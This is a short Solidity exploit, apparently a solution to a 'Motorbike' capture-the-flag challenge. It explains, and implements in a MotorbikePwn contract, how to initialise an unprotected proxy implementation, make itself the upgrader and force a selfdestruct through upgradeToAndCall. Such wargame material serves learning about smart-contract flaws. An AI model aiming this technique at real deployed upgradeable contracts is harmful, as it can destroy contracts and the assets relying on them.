//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Proxy contract Address : 0x66d3c2855745CCa06BB4ed480cA821781d7E3F36
// Implementation Address : 0x360f3393f38e07b7a598b691ea39aa42ad8bd79a

interface IEngine {

function initialize() external;
function upgradeToAndCall(address newImplementation, bytes memory data) external payable;

}

/* 
ATTACK PLAN
proxy contract - motorbike
implementation contract - engine

design our own contract A



1. If you look closely the constructor of 'motorbike' proxy contract uses 'delegatecall' when calling the
  initialize function of 'engine' contract 
    hence the 'upgrader' still remains a zero address'0x00000'

2. We can create an alternative MotorbikePwn contract and become the 'upgrader'   

- contract A becomes upgrader 
- contract A becomes the implementation contract by calling 'upgradeToAndCall'
- so when the implementation contract delegatecalls into our contract - it will be made to call our destroy() function

mission accomplished
*/

contract MotorbikePwn {

address _implementation = 0x360f3393f38e07B7a598B691Ea39AA42ad8Bd79a;       // obtained using RPC call 'getStorageAt'    
IEngine engine = IEngine(_implementation);

function motorPwn() external {

bytes memory _data = abi.encodeWithSelector(this.destroy.selector);
engine.initialize();
engine.upgradeToAndCall(address(this), _data);

}

function destroy () external {
selfdestruct(payable(address(0)));
}

}